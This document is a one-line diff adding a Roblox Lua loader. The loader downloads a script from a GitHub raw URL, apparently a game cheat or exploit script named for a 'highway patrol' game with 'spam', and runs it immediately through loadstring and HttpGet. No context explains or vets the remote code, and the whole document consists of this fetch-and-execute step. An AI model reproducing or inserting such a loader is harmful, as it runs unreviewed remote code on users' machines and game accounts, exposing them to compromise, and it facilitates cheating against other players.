@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/highway-patrol-alpha-spam5-0aqm1w42gyxbe1.lua"))()
